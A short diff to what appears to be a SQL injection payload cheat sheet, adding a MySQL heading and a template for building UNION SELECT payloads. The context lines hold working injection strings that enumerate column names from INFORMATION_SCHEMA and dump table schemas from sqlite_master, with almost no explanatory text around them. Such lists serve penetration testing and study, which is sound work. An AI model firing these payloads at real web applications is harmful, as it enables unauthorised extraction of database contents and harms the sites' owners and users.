@@ -7,6 +7,7 @@
 
     
 ..............................................................................
+# MySQL
 
     0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
     0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
@@ -56,7 +57,10 @@
     ' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' --
     ' UNION SELECT null, sql FROM sqlite_master WHERE type='table' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' --
     ' UNION SELECT group_concat(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' --
+### The structure of the command code to create the desired payload is as follows
+        'union select <column> FROM <table_name> Were <conditions > --
     
+        
 .....................................................................................................................
     
     ' UNION SELECT NULL --
